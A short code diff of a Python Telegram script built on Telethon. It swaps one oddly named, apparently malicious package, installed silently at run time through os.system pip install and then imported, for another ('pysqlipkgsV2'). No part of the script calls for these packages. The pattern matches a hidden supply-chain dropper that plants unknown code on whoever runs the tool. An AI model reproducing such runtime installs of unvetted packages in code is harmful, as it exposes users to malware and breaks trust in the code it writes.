@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipfontinglibaryV1")
-import pipfontinglibaryV1
+os.system("pip install pysqlipkgsV2")
+import pysqlipkgsV2
 from telethon.sync import TelegramClient
 from telethon.tl.functions.messages import GetDialogsRequest
 from telethon.tl.types import InputPeerEmpty, InputPeerChannel
